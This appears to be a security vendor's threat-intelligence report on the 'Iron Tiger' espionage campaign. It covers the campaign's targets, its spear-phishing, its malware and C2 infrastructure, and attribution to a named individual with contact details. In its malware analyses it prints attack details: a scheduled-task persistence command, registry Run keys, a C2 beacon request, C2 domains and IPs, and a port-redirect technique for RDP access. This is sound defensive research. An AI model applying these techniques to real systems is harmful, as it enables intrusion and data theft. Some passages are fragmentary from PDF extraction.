Mitigation: Combating cyber
espionage and targeted
attacks

If a single piece of valuable information can put a nation at a disadvantage, what could much more
stolen data do? A group of China-based threat actors known as “Emissary Panda1” or “Threat
Group-3390 (TG-3390)2” may know the answer, as they have been seen stealing terabytes of
confidential data from employees of high-technology companies in the United States (US) since
2013.
Their target? Government defense contractors and related companies. They specifically
targeted the directors and managers of US companies in the electric, aerospace, intelligence,
telecommunications, energy, and nuclear engineering industries, among others. Looking at the
targets, we believe the attackers constantly monitored technology-inclined US government
contractors.
In a cyber-espionage operation we dubbed “Iron Tiger,” the actors first spent years spying on
political targets and government agencies in China, Hong Kong, and the Philippines back in 2010
before eyeing technology-related organizations in the US. Given the huge geographical shift in
target, it is very likely that Iron Tiger is only part of a bigger campaign where specific targets are
assigned to various teams.
The actors have stolen emails, full Active Directory® dumps, intellectual property, strategic
planning documents, and budget- or finance-related content—all of which can be used to sabotage
target governments’ or private organizations’ plans. We’ve even seen them nab up to 58GB
worth of data from a single target. They could have even stolen terabytes of data in total.
We found convincing evidence pointing to China as the threat actors’ primary location. These
indicators include the use of virtual private network (VPN) servers that only accepted Chinabased registrants, Chinese file names and passwords, and China-registered domains. Specifically
following two virtual aliases, “phpxss” and “ershao,” we were able to attribute operational
activities to a key personality physically located in China.
Note that the actors are skilled in launching digital attacks. They not only followed new malwarecreation tool releases but also used customized tools like dnstunserver and abused legitimate
services like Blogspot™ and the Google Cloud Platform™. Using legitimate services allowed
them to evade monitoring and efficiently change command-and-control (C&C) servers in case
of discovery.
While their techniques may be quite advanced, they adapt to their target networks’ security
levels and sparingly used sophisticated methods. Like any organized and motivated team, they
exerted minimal effort to achieve maximum results.

Targets: From Asia-Pacific to the US

Quality trumps quantity as far as Iron Tiger goes. It targets fewer individuals and organizations compared
with other campaigns like Russia-based cyber-espionage operation, Pawn Storm3. Yet like Pawn Storm,
Iron Tiger also spies on organizations where they are based.

Global distribution of Iron Tiger’s targets

The actors first monitored targets in the education industry in China, political dissidents in Hong Kong,
government agencies in the Philippines, and political targets in Tibet as far back as 2010. We believe
individual targets from each country were picked to gather inside information on political events that
prevailed at the time.
The actors use spear-phishing email subjects that would be interesting to their chosen targets. They used
“Han Zheng stays at Regent Pan—Housing protest held in advance” as lure to entice curious political targets
to join a protest against then-mayor of Shanghai4. Other subjects exposed the attackers’ aim to target very
important persons (VIPs), engineers, and/or public relations (PR) or communication officers.

In 2013, Iron Tiger’s targets changed. After achieving cyberspying feats, the attackers set out to catch
bigger fish—individuals in defense- and technology-related fields like aerospace, energy, intelligence,
nuclear engineering, and telecommunications. Looking at the targets, we believe the attackers constantly
monitored high-technology contractors of the US government.

Up to terabytes of stolen data
The actors are believed to have stolen up to terabytes of data, given the sheer amount of information
they gathered from each target. They were able to extract as much as 58GB worth of data from a single
organization. This was even more than the 40GB worth of data leaked after the Sony Pictures hack5.

Types of data stolen by the Iron Tiger actors

A compromised Microsoft® Exchange™ server
showed that Iron Tiger uses various exfiltration
routines. They install two different backdoors—
BKDR_PLUGX.XXT and Dllshellexc2010 (which
specifically affects Microsoft Exchange). They
rename files prior to extraction using extensions
like .CSS to bypass security protections put in
place for archived files (.ZIP, .7z, .RAR, etc.).

The actors also use Robocopy, an application that lets users remotely copy files to local hard drives in order
to extract them from a server. Finally, they export mailboxes to a .PST file using the “Export-Mailbox”
PowerShell command. Data meant to be stolen is always stored as encrypted .7z files in the Microsoft
Outlook® Web App (OWA) folder.

With all of the files in their hands, the actors may know
everything about the network and its users, making lateral
movement possible. The possibilities are endless. At this point,
they obtain the highest privilege levels on the compromised
network.

Actors: Tracing the operation’s Chinese
roots

The following pieces of evidence revealed that the Iron Tiger actors can be Chinese-speaking individuals
proficient in computer security and launching digital attacks:
•

The VPN servers were mostly located in China like those provided by BAIGE VPN.

•

The file names and passwords used were Chinese.

•

Some text resources and language IDs used in malware binaries were set to simplified Chinese.

•

HUC Packet Transmit Tool (HTran) is frequently used by Chinese threat actors.

•

Whois data revealed that related domains like shangxian.info were registered with physical addresses
in China.

•

The other related resources (QQ, Lofter, 163.com) are popularly used in China.

Is “Fei” behind Iron Tiger?
Following virtual aliases related to Iron Tiger allowed us to attribute operational activities to a key
personality—Guo Fei—who resides in Shanghai, China.

Phpxss and exenull
The systematic use of these two nicknames, their use of the same password to encrypt files, and the way they
accessed C&C servers made us believe that only a few key individuals rather than a huge group of people
were behind the campaign. Phpxss was probably a reference to cross-site scripting (XSS) vulnerabilities
based on PHP. This choice of nickname made us believe that the actor had ties to traditional cybercrime.
Phpxss had ties to xssok.blogspot.com and phpxss.lofter.com—C&C servers for three Trojans (dnstunnel,
NBDDOS, and PlugX) related to Iron Tiger. The malicious tool, dnstunclient, accesses xssok.blogspot.com
to know what the controlling IP address is. A Gh0st variant, meanwhile, accesses phpxss.lofter.com, which
leads to a C&C server.
Phpxss also serves as username for several email addresses from different free email providers and the
BAIGE-VPN-provided service. One of the subdomains under shangxian.info that points to a C&C server
has also been registered with the name, “php xss,” and the email address, [REDACTED]s @ gmail . com.

We also found a blog comment with the name, “phpxss,” which led to an email address; a QQ number
(693149); and the name, “Guo Fei.” Additional research on the QQ number led us to a person named
“郭飞,” which translates to “Guo Fei.” The name, “exenull,” meanwhile, was used by the same person to
register on target sites or forums.

Ershao and myershao
Ershao and myershao were other nicknames tied to the name, “Guo Fei.” These were found in leaked
underground forum databases and had ties to the same QQ number that phpxss used. A related email
address found in underground forums, [REDACTED]o @ live . cn, was also used to register the domain,
mai1.info, which had ties to Iron Tiger.

Operation: Iron Tiger hacks targets’
defenses

The Iron Tiger actors can be skilled computer security experts but sparingly used advanced techniques,
given their weakly protected target networks. They do not follow a specific schedule when it came to
launching attacks. Instead, they prioritize attacks based on a list of chosen targets. We have, for instance,
seen them dump the contents of a company’s Active Directory database nine months prior to actual data
exfiltration.

Malware and tools that Iron Tiger used sorted by compilation date

Investigations revealed several Iron Tiger-specific routines. The actors are fond of using customized hacking
tools like dnstunserver and known targeted attack malware, PlugX and Gh0st variants, to remotely access
target networks.
The attackers abuse free Web services to accomplish their goals. They set up C&C servers in the free blogging
platform, Blogspot; connected a Gh0st variant to the Chinese blogging platform, Lofter; and created email

11 | Operation Iron Tiger

accounts in Gmail™ and Microsoft Outlook. They also maintain a clean and controlled command center,
going as far as patching one of the C&C servers they compromised and running the WebShellKill backdoor
finder on it to keep cybercriminals or script kiddies away.
When laterally moving inside networks, they use a stolen code-signing certificate from Korea-based security
company, SoftCamp Co., Ltd., to evade security solutions. To get deeper into networks, they intercept
Microsoft Exchange™ credentials using Robocopy and the “Export-Mailbox” PowerShell command—both
unique means. They also use a Trojan that was specifically designed to only work on the Google Cloud
Platform.

Spear phishing
The Iron Tiger actors likely gather solid information about organizations they want to infiltrate before
zeroing in on specific figure heads. Quick Web searches on how specific organizations formulate email
addresses can give them clues on target individuals’ specific addresses. Using these addresses, the attackers
have been sending spear-phishing emails to compromise computers in target networks as early as April
2010.
The target individuals have varying professional classes, ranging from company executives and government
officials to engineers and PR officers. Some of their addresses can be easily found on the Internet. Others
are not publicly available, which shows that the attackers have a certain level of maturity in reconnaissance
or data gathering.
The actors use two addresses to send spear-phishing emails. One of these has been in use since 2010. This
is surprising, given that threat actors typically drop email addresses after a short period of time in order to
evade detection. This can be a reflection of their confidence that their spear-phishing campaigns will stay
undetected regardless.
The “From” field in messages sent via both addresses is usually modified to reflect the spear-phishing
scheme used for a given target. The attackers often use names that pique the targets’ interests (affiliated
with news agencies like the British Broadcasting Corporation [BBC] or the Agence France-Presse [AFP]).
Subjects ranging from the generic to the more professional or personal are also used. Samples include
“Shanghai mayor Han Zheng visits Taipei to promote World Expo,” “Han Zheng stays at Regent Pan—
Housing protest held in advance,” and “Sino-US cooperation on maritime security seminar neighborhoods.”

More spear-phishing email subjects used in Iron Tiger

14 | Operation Iron Tiger

The spear-phishing emails had limited content, usually only one or two lines of text. They came with archive
file attachments (usually .RAR files) that contained malicious .EXE files.

Sample Iron Tiger spear-phishing email

The email above had a hidden image, which was actually a “Web bug” that allowed attackers to get more
information from target systems like IP addresses, browser versions, and others. Some emails had slightly
obfuscated code. When deobfuscated, the code tries to run a remote script. We were, unfortunately, unable
to retrieve the said js.php script.

Arsenal
While the malware and tools that the actors used were publicly available, some were not at the time this
paper was written.

Dnstunclient
Dnstunclientwasnamedafterstringsfoundinsideitsbinary(SHA-1:afce5e56fc9bd1774d0cbbab1df205d0152fc632,
detected by Trend Micro as HKTL_DNSTunnel). This has an interesting way of communicating with the
attackers and finding C&C servers. It fetches the home page of a blog, xssok.blogspot.com, with information
on how to reach a C&C server. Contacting the blog was registered as a scheduled task on a compromised
system, which runs every Sunday at 8:00 A.M. (matching the infected system’s time zone) and fetches the
Blogspot page.

16 | Operation Iron Tiger

Example: “$$$$$$$$$$SUN#####10.10.10.10$$$$$$$$$$”

On Windows Vista or newer systems, the scheduled task is registered as shown below.

System\Microsoft Windows” /tr [FILE NAME]

/sc weekly /d SUN /st 08:00:00 /ru

System”

Scheduled task code on Windows Vista or newer systems

Running the scheduled task decodes the information provided by the blog so the system can access the
actual C&C server. A reverse command shell then runs using the Domain Name System (DNS) protocol
with CNAME and A queries on User Datagram Protocol (UDP) port 53.

17 | Operation Iron Tiger

DNS protocol used as communication channel by a malware variant

The said malware is Base64 encrypted and so can easily be decrypted. Further analysis of the binary
revealed that it was a command-line tool that was modified to work on its own. Its original version can be
used with arguments like:
•

dnstunclient -ip <server ip address>

•

dnstunclient -d or -domain <domain>

The modified version, meanwhile, forced the use of xssok.blogspot.com.

v5 = (int *)argv;
*argv = aAaa;
argv[1] = aIp_0;

//Set argument 1 to –ip

v6 = (const char *)sub_402A40(); //get C2 server ip from blog
argv[2] = v6; //Set argument 2 to C2 server ip

Modified tool code that forces the use of xssok.blogspot.com instead of arguments

Reverse engineering allowed us to see the tool’s original output. The original dnstunclient is a console
program that can be used for temporary lateral movement but it has been modified to act as a Trojan. The
modified tool adds extra functions to replace or add parameters while the original always read parameters
from the console input. As such, the modified tool grabs parameters from a remote Web page.

18 | Operation Iron Tiger

Sample output of the original dnstunclient tool

The “wzrapbia” string the modified tool creates is automatically generated but can’t be used as an indicator
of compromise (IoC).
Over the past year, Iron Tiger increasingly used similar channels to communicate—an obvious attempt at
staying undetected. Log file reviewers will probably classify Blogspot-related requests as legitimate but
dnstunclient still only accesses xssok.blogspot.com once a week as a precautionary measure.
We monitored xssok.blogspot.com for C&C changes for several months but saw very few modifications.
The blog, for instance, moved twice to an internal IP address (192.168.[REDACTED]) before switching
again to a compromised server owned by an Asian academic institution.

Dnstunserver
Dnstunserver is not available anywhere online, even on underground forums. It was most likely developed
or bought for Iron Tiger’s exclusive use.
The binary (SHA-1: eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c, detected by Trend Micro as HKTL_
DNSTunnel) was compiled just this February. It is dnstunclient’s server part. When launched, it opens a
fake DNS service on UDP port 53 and waits for connections from victims. When a connection is established,
dnstunserver provides a remote shell that allows the attackers to execute commands on infected computers.
Dnstunserver’s server part has interesting debug information like the following paths with Chinese words
formed using the Guojia Biaozhun (GB2312) character set, the “national standard” (Note that “桌面”
translates to “desktop.”):

Exchange backdoor + WebShell = Dllshellexc2010
Iron Tiger uses a backdoor called “Dllshellexc2010” by its author on a Microsoft Exchange server that
belongs to a target. Dllshellexc2010 is a tool customized for the attackers’ exclusive use. It is a .NET module
(SHA-1: 08afa64b23288c0414b379cb4e67c1a8dabea033), a very small dynamic link library (DLL) (less
than 8kB in size) that can be installed on Microsoft Exchange or Internet Information Services (IIS) servers
for the purpose of stealing users’ authentication credentials while logging in. It provides a WebShell to the
machine, in addition to credential-stealing capabilities.

c:\Users\ljw\Documents\prj\dllshell\Dllshell\Dllshellexc2010\obj\Release\
Microsoft.Exchange.Clients.Auth.pdb

Debug string found in Dllshellexc2010’s binary

WebShell that Dllshellexc2010 provides

The WebShell does not require any physical ASP.NET file to be present in the IIS directory. It runs every time
an HTTP request to any path ending with “x.aspx” is sent. It creates a temporary file called “8xla90ssz7693.
tmp” with a tiny WebShell in the %TEMP% folder, which is later executed.
Dllshellexc2010’s source code shows that it extracts a parameter called “chopper” when executed, just like
the infamous WebShell, 中國菜刀 or China Chopper6. We believe this DLL was created by someone very
familiar with China Chopper. We decided to test it in a controlled China Chopper environment and found

20 | Operation Iron Tiger

that it worked perfectly. Dllshellexc2010 also intercepts Microsoft Exchange credentials every time a request
path that contains “/auth.owa,” a default log-in path for OWA, is used. Note the use of Chinese in the log
file generated. Intercepted credentials are written to a hard-coded file called “%TEMP%\~4DAF8B\~P486.
jpg” on the infected system’s disk. It uses the .JPG extension even though it is actually a text file.

Attacker’s browsing history and related tools
We were able to examine the browsing history of a C&C server that the actors compromised and saw how
they quietly accessed parts of their arsenal (malware and tools) that was hosted elsewhere online. They
stored a lot of their usual tools on a mac.pm server, which was hosted in the US and whose name servers
are known for having ties to malware-related activities.

The files in the table on the previous page have since been removed. One of the target organizations must
have cleaned its Web server.
3f.7z, a file downloaded from a compromised server, was encrypted with an unknown password. We were
unable to decrypt it but were able to list its contents. The same files related to the PlugX or KorPlug RAT
were found on the C&C server. These were likely the contents of 3f.7z.

WebShellKill
The Iron Tiger actors downloaded a Chinese tool called “WebShellKill,” which is publicly available. They
use an old version (V1.4.1) of the tool even if V1.7.2 was already available at the time this paper was written.

WebShellKill features as advertised by its author

It may be puzzling to find WebShellKill on attackers’ servers because it is used to find backdoors in code
(PHP, ASP, VBS, etc.). But since attackers generally plant backdoors anywhere, why would they want to
remove them?
We quite easily found the answer when we saw the actors compromise a server and immediately launch the
tool. The server they chose had several backdoors, which they got rid of via WebShellKill. They probably
wanted to make sure the compromised server was clean and could not be easily accessed by script kiddies
or even cyberdefenders.

23 | Operation Iron Tiger

The Iron Tiger actors seem to really care about not being
hacked. They went so far as patching a compromised C&C
server by logging in as administrator and deploying security
fixes.

Google Cloud Platform Trojan
The Iron Tiger actors bought a Trojan that
only worked on the Google Cloud Platform. Its
C&C server accesses an appspot.com domain.
We found a version of the Trojan’s server-side
component that was coded in Python. Note that

Google Cloud Platform Trojan’s functions

The Trojan was installed on 13 machines that belong to a target company most likely for lateral movement.
We also found a variant of its client part that was compiled on 23 March 2015. The sample is named
“svchost.exe,” a supposed key Microsoft Windows component. When launched, the binary tries to establish
persistence by adding a “Run” registry key named “iisini” to execute the file.

The Iron Tiger actors use three different RATs

commonly associated with targeted attacks
originating from China.

Code that creates a persistence registry key on infected systems

BKDR_PLUGX
PlugX7, also known as “Sogu,” “Gulpix,” or “KorPlug,” has been used as a RAT in several targeted attack
campaigns. Its author8 or a developer with access to its source code has been updating it on a regular basis.

25 | Operation Iron Tiger

PlugX variants use the DLL side-loading method to infect target computers. DLL side-loading involves
abusing a legitimate Windows executable file to load a malicious DLL (PlugX) instead of a legitimate
library. All this requires is naming the malicious binary the same as the DLL that attackers wish to execute.
PlugX is then loaded instead of the legitimate library in a system folder.

Sample PlugX attack scenario

The actors used the method above to infect computers aided by legitimate binaries from Microsoft or antivirus
companies like Symantec and F-Secure. We have seen them use a Microsoft-signed binary, Form.exe. This was
dropped, along with two other files, FormDll.dll (SHA-1: 4df17c9e64f7277538141e384d4a372c60787f1a)
and Form.hlp (SHA-1: d3fb95d0eeccd99c475c6b985a6c911bed69f50d). FormDll.dll contained all of the
malicious code while Form.hlp had the main malware binary and configuration. When the legitimate
Form.exe is launched, PlugX:
•

Copies three components to C:\Windows\System32

•

Sets the files’ attributes to “hidden” and “system”

•

Sets the files’ time stamps to “2008/04/14”

•

Creates the service, “Microsoft .Net Framework NGEN 4.0”

•

Starts a zombie process called “svchost.exe” and injects code

•

Removes itself from infected systems

PlugX SController 3.0
SController 3.0 is the internal name of some variants of the PlugX server-side binary. Its GUI, meanwhile, is
called “PureICE.” PureICE’s Users panel provides a lot of information about infected machines, including:
•

Computer name

•

Memo

•

Local area network (LAN) IP

•

•

Wireless LAN (WLAN) IP

•

•

The panel also groups infected machines based
on user definition though a default group name is
always present, “U.S.A.”

The second panel, Listeners, shows the server settings. It supports Transmission Control Protocol (TCP)
and UDP. Note that TCP can accept HTTP or raw TCP transmissions at the same time. Clicking the infected
machines’ icons shows the Manager panel.

PureICE’s GUI had English spelling mistakes. Some features did not even use English, only Chinese.
PureICE’s Manager panel had various functions, including:
•

•

Processes (process manager)

•

PlugX has, to our knowledge, never been used by non-Chinese attackers, once again strengthening our
assumption that Iron Tiger hails from China.

Gh0st variants
We found several variants of the infamous Gh0st RAT used in Iron Tiger as well.

S.exe
One of the Gh0st variants, s.exe (SHA-1:
7b34f24703b5415bc46fdab3801ac79e3e82242a)
has a lot of obfuscation functions. While it is
heavily encrypted, in memory, it is easier to see
the infamous string, “Game Over Good Luck By
Wind,” appear.

Some of its functions were also deactivated. It
accesses the following C&C servers:
•

gameofthrones.ddns.net

•

user.qzone.qq.com/1479457083

•

ys168.com

Gameofthrones.ddns.net has been hosted in various countries since February 2015, including the US,
Vietnam, and South Korea. Interestingly, one of its domains always points to the IP address, chrome.
servehttp.com. We have yet to gather samples accessing the said C&C server though.
Ys168.com is a dynamic DNS in the form, <username>.ys168.com. Ys168.com without the subdomain as a
C&C server could have been just a mistake on the attackers’ part. This did not have any effect, however, as
s.exe could still access other C&C servers.

29 | Operation Iron Tiger

User.qzone.qq.com/1479457083 was a static link that s.exe used to directly get a C&C server’s IP address
from the Web page’s title. This page’s account has been suspended though.

Ring RAT

Iron

Gh0st

variant

(SHA-1:

names in Ring RAT’s binary—CGh0stDoc and

CGh0stView—made it easy to see that it is a Gh0st
RAT derivative.

Ring RAT’s controller

Ring RAT’s controller had several capabilities, including:
•

•

System manager

•

Keylogger

•

Screen capture

•

Remote shell provider

•

Remarks (notes)

30 | Operation Iron Tiger

Its builder, which allows attackers to easily create binaries to infect target systems, had several interesting
improvements from Gh0st RAT, including:
•

The “Active From” field allows attackers to configure specific times to activate malware. This is very
useful when they only want to send out data at certain hours that are less visible to victims monitoring
network log files.

•

The “File Type” option allows attackers to only collect files with configured extensions (.DOC, .TXT,
.PPT).

•

“Add D-Signature” allows attackers to add digital signatures to binaries so these would be harder to
detect.

•

“Auto Fection U Disk” allows malware to automatically infect connected USB drives.

Ring RAT’s Build Server features

The additional features revealed that Ring RAT was built for espionage purposes.

Ring RAT is not available in underground forums or any
publicly accessible site. This modified Gh0st RAT could have
been created for Iron Tiger’s or a closed community’s exclusive
use.

31 | Operation Iron Tiger

NBDDOS
Iron Tiger uses another Gh0st RAT variant, NBDDOS. A file named “ver.exe” (SHA-1:
8c8f12ae866c38931e19d67fadc19bd18aaf0865), which was compiled on 26 December 2014, drops a DLL
(SHA-1: 5b638171811412b570ed500803ceca5ed85580ff), which was compiled 1 minute before ver.exe
was.
The DLL was dropped into %TEMP% then moved to %system%. Careful examination and comparison with
Gh0st’s code revealed that it was another derivative of the latter. NBDDOS is installed as a service named
“MediaCenter.” This can’t be used as an IoC, however, since it can be easily configured using the builder.

NBDDOS’s service name and description

NBDDOS’s installation function can be modified using a multi-strcat function, probably in an attempt to
evade string-based detection. Its C&C server address can be extracted from a Web page or is hard-coded
in its binary.

Improved NBDDOS installation function

32 | Operation Iron Tiger

Two C&C server types supported by NBDDOS

NBDDOS was configured to retrieve C&C server addresses from a single Web page—phpxss.lofter.com.
Lofter.com is a light blogging or social networking service. It also uses “phpxss” as account name.
If the Web page option is configured, the IP address and port number must be surrounded by a unique
magic string, “$$$$$$$$$$$$.” Two magic strings accompany the C&C server string, which can help
serve as an IoC for other security investigators. Compared with the original Gh0st RAT, NBDDOS uses a
different encryption function.

33 | Operation Iron Tiger

NBDDOS’s encryption function

NBDDOS also uses a special string, “Vip20141226,” where “20141226” can correspond to the binary’s
compilation date. We have no idea though what “Vip” represents. The only reference we found was inside
the controller, near the credentials.
An NBDDOS controller used in Iron Tiger (SHA-1: 396af3ae018a9e251a832cce8aae1bcaa11cdc05)
compiled on 8 December 2014 was named “hello.exe.”

NBDDOS controller’s GUI

34 | Operation Iron Tiger

Most of the original Gh0st RAT’s functions have
been removed from NBDDOS, except for the
remote control feature. Its builder supports the
C&C server types, namely:
•

C&C information extracted from a Web page
or file

•

Use of DNS resolution

•

Use of direct IP addresses

Two packers—UPX and FSG—are available though
users can also generate unpacked malware.
Malware service names can be easily changed on
infected systems via the same interface.
NBDDOS can easily be downloaded from Chinese
underground forums.

GTalkTrojan
GTalkTrojan (SHA-1: 50d2fef4e680072441084053773350d9ba60cac6), which was compiled on 15
October 2012, has very few functions, including:
•

Provides a remote shell

•

Has a “getfile” feature for data exfiltration (Note that it can only send files from a victim’s computer to
a C&C server.)

•

Has a “settime” feature to set when infected systems should access C&C servers (default: 1 second)

35 | Operation Iron Tiger

“Getfile” and “settime” functions of GTalkTrojan

To remain persistent, GTalkTrojan adds a RunOnce registry key, HKEY_CURRENT_USER\SOFTWARE\
Microsoft\Windows\CurrentVersion\RunOnce\. It then copies itself into c:\windows\svchost.exe,
creates a “cmd” command pipe, and accesses a C&C server—update.gtalklite.com—via port 8080.

GTalkTrojan’s registration information

We found two other domains registered with the same information though they were not used in any
targeted attack operation that we know of.

HTTPBrowser
HTTPBrowser infects systems like PlugX does—via DLL side-loading. One version (SHA-1:
75f098d6b3f217aba4c068b12896c332216fc6b3) used in Iron Tiger employed a legitimate Kaspersky
binary named “setup.exe” to infect systems with a malicious DLL. When launched, setup.exe:
•

Loads msi.dll via the DLL Hijacking technique

•

Unencrypts and runs msi.dll in memory

•

Copies itself into %ALLUSER%\Application Data\kav\

•

Creates the Run registry key, HKLM\Software\Microsoft\Current Version\Run, to remain persistent

•

Creates the suspended process, msiexec.exe [CnC IP] [CnC Port] 1

•

Creates and runs a remote thread in the suspended process

•

Unpacks msi.dll.url

•

Replaces the original msiexec.exe image in memory with a malicious code

•

Executes the malicious code

•

Accesses a C&C server and waits for commands

38 | Operation Iron Tiger

HTTPBrowser uses a specific technique to bypass User Access Control (UAC)9.

HTTPBrowser’s C&C server IP address and port information

HTTPBrowser accesses a C&C server with the IP address, 103.24.1.54, via port 443. This was hosted in
Hong Kong at the time this paper was written. It creates a unique GUID that is stored in config.ini on
infected systems. It then accesses a C&C server using the following HTTP GET request:
GET /loop?c=[computer]->[user]&l=[ip]&o=[os version]&u=[client id]&r=[inject
mode]&t=[time stamp]
Host: REDACTED
Connection: Keep-Alive
User-Agent: HttpBrowser/1.0

HTTPBrowser has remote shell-creation, uploading and/or downloading, and file-listing functions, which
make it a lightweight RAT that capable of executing more malicious commands or even exfiltrating data.
To the best of our knowledge, it is not available in underground forums or other publicly accessible sites. It
could have been created for the exclusive use in targeted attacks.

Old unpatched servers that can be found online are easy prey
to any attacker.

File certificate abusers
Iron Tiger uses three tools signed with the certificates on the next page.

Certificate’s validity information

November 2012

The certificate with serial number, 23 92 b8 b2 e1 d5 e9 27 c7 26 37 9b 45 d2 21 ce, valid from 15 September
2012 to 15 November 2014, was issued by Korea-based company, SoftCamp. It was signed on 22 November
2012 and has been used for the Netcat (nc) binary, HTran’s packed version, and a GSecDump binary.
It is not clear why the actors decided to sign files but not the malware at the same time and in the same way.
We have not seen any of the other file certificates they used. This could be because they did not need them
and found that their tools and malware were enough to stealthily move inside target networks. Adding
the legitimate file certificate to their arsenal made it easier for the attackers to laterally move throughout
networks and collect user credentials without getting noticed. Signed binaries are not often monitored by
security solutions.

Mimikatz, ZhuMimikatz, and Invoke-Mimikatz
We found several variants of the Mimikatz password dumper. While some were common versions
(SHA-1: 3d3db9d8da0eba33444c73b6f85a4fd98a685055), others were not like ZhuMimikatz (SHA1: 4883376735f981386e473318482fadfe90edc670) and two Mimikatz PowerShell versions (SHA-1:

These allowed Mimikatz to completely work in memory without leaving traces on the file system.

GSecDump
GSecDump is a free publicly available password dumper. It has been used for years by various threat actors
and legitimate security auditors alike. Nearly all threat actors slightly modified the GSecDump binary to
evade antivirus detection. All versions found are, in fact, detected on VirusTotal.

QuarksPwDump

detected by Trend Micro as HKTL_PWDump), along with its source code, are also publicly available for
free on https://github.com/quarkslab/quarkspwdump. The actors, however, compiled their own version
in June 2012, a month after the release of the original code. This showed that they closely monitored such
security tool updates.

Though we could not identify this toolkit’s name, we found that it comprised netcat and two files—drivers.
exe (SHA-1: add6f880705b4aaf4b22b60dd67ca9034694550d, detected by Trend Micro as HKTL_
PORTCON) and ChangePort.exe (SHA-1: a346588c70751815bbb4c0922ea2c5e1ab9953db, also HKTL_
PORTCON). It is very rarely seen in targeted attack campaigns.
Attackers who want to access RDP 3389 via port 80 on an IIS server configured to only leave port 80 open
can use this toolkit, among others. We saw attackers:
•

Execute drivers.exe on the IIS server, which installs a Network Driver Interface Specification (NDIS)
driver

•

Run ChangePort.exe to map any port to port 3389 on the IIS server

•

Execute nc.exe and access the target server via port 80

•

When a connection has been established, send the special string, “Send chkroot2007,” and disconnect

•

An RDP client can now be connected to a target system’s port 80 while all network traffic is redirected
to port 3389

Because the attackers identified themselves by sending the special string, only their traffic is redirected.
Everyone else’s will be unaffected and stay on port 80.

Infrastructure
Iron Tiger’s C&C infrastructure included several compromised servers and the extensive use of BAIGE
VPN’s services.

Compromised C&C servers
Iron Tiger successfully compromised an Asian academic institution’s server to act as C&C server and stolen
data drop zone for dnstunclient. It was also accessed by a PlugX variant through a subdomain of shangxian.
info. We decided not to disclose this subdomain though since it can reveal the academic institution’s name.
This server was poorly configured. It was also used by warez distributors, in addition to the actors. The
warez distributors used it to store videos for virtually anyone on the Internet. FTP access to it did not
require authentication. As such, anyone can use its various folders. One user even created a folder with a
funny name just to show how poorly secured the server was.

Data collected from C&C servers
We were able to gather a lot of information from Iron Tiger’s main C&C server—the academic institution’s
compromised server.

Network connections made to C&C servers
Several network connections made via RDP were seen. This is not surprising, as the protocol is used to
access remote computers from different geographical locations. The actors accessed the C&C server using
various IP addresses.

IP addresses that the actors use to access the C&C server

46 | Operation Iron Tiger

The computer name, “YOUSISTE,” frequently accessed the server, though we did not find useful information
on it. Interestingly, two different computers used the same IP address to access the C&C server. An attacker
could have used two computers to access the server or several attackers could have used the same attack
infrastructure.
We believe the RDP connections were aided by VPN services and/or compromised computers, making the
actors harder to track and find. A connection going to a Chinese IP address (116.233.12.114), which was
used as a data-exfiltration channel, was also seen.

Attackers’ local account
A single user account named “xss” was created on the C&C server (compromised Windows Server® 2003)
on 14 September 2014. It used the password, “woshinidie,” which translates to “I am your father” in Pinyin.
Pinyin is the official phonetic system for transcribing Mandarin pronunciations of Chinese characters into
the Latin alphabet. This password could be a funny reference to “Star Wars.”
The letters, “xss,” also seen in the Blogspot page (xssok), were again seen in reference to the C&C server.
The xss user account was used in the last quarter of 2014. It has not been used since. Instead, the real
administrator account was used.

Additional email accounts
Apart from the account used in spear-phishing campaigns, we saw the actors use additional email accounts
for various purposes. They had several email accounts, mostly for testing purposes, with “phpxss” or
“testxss” from providers like Gmail™, Hotmail, AOL, and Yahoo!®.
The actors could be reporting to a different email address per victim. They, for instance, sent a list of files
from a compromised system to a specific email address, which indicated the progress made. It is not clear,
however, if the receiver was a member of the group or a third party that provided expert services to let
attackers know which files were worth stealing.

Extensive use of BAIGE VPN’s services
Phpxss extensively used BAIGE VPN’s servers, which were mostly located in China (a little more than 500
different IP addresses). Some servers were located in the US, Canada, Hong Kong, Russia, Taiwan, Japan,
and South Korea.

Countries where BAIGE VPN servers were located

BAIGE VPN offers very affordable services. Its most expensive offering was a one-year subscription worth
130 Yuan (around €19). Its Windows client is pretty straightforward.

BAIGE VPN’s client GUI

While phpxss appears to use this service, it may not be the only one. To ensure anonymity, attackers
normally hid behind several layers or VPNs or proxies.

BAIGE VPN does not accept customers outside China. It
immediately filters out external connections via a registration
page.
Domain registration
Iron Tiger used several legitimate online services for its infrastructure but also employed registered
domains.

Shangxian.info
One of shangxian.info’s subdomains was configured to point to the main C&C server’s IP address. The
domain was registered by phpxss.
Interestingly, one user named “myershao” uses the exact same password as phpxss to create a local account
on a compromised machine. A familiar email address, [REDACTED]o @ live . cn, was also seen.

49 | Operation Iron Tiger

Pi.mai1.info
Pi.mai1.info was used in relation to two malware families at the same time—Gh0st and PlugX. These served
as file attachments in a spear-phishing campaign.
In one campaign, a .RAR file named “documentation.rar” contained a dropper (SHA-1:
3bcd90785ff5883bc460a74eca3bf9033a542335) of a Gh0st variant named “NWCWorkstationex.dll”
(SHA-1: 96d6a67227a6d650ab8c5465cb4b091217e75a5f). NWCWorkstationex.dll could be an early
version of Ring RAT configured to steal .DOC, .TXT, and .PPT files.

Target file types hard-coded in the NWCWorkstationex.dll binary

Another archive seen contained a dropper (SHA-1: 11348a72a0864c6c455a535d5d7bde2997270266) of a
Poison Ivy variant (SHA-1: 6bcd525bb425dbb7fbc79dd6a605fac8f925b0cb) named “mspmsnsv.dll.” Its
configuration leaked the nickname, “2shao,” which we were not able to tie to a real person’s identity or
profile.
Mai1.info’s registration information has changed several times. It showed references to supposed identities
in Russia or the US at the time it was being actively used by malware. It had matching elements tied to
[REDACTED]o @ live . cn and Guo Fei.

Registrant Name: Guo Fei [REDACTED]
Registrant Organization:
Registrant Street1: He Nan Sheng Huo Jia Xian
Registrant Street2:
Registrant Street3:
Registrant City: XinXiang
Registrant State/Province: HeNan
Registrant Postal Code: 0373
Registrant Country: CN
Registrant Phone: +86.[REDACTED]39262

Mitigation: Combating cyber espionage and
targeted attacks

Foreign spies in espionage films help their nations obtain competitive advantages over others by jumping
seemingly impossible hoops and hurdles. These days, spying happens in cyberspace where threat actors
are aided by either ready-made or customized tools and social engineering lures.
We saw cyberspies with digital roots in China target high-technology organizations from the US, but not
before spending years extracting information from targets in Asia-Pacific, including their own country.
Iron Tiger, which could be part of a larger campaign where actors are assigned specific targets to monitor,
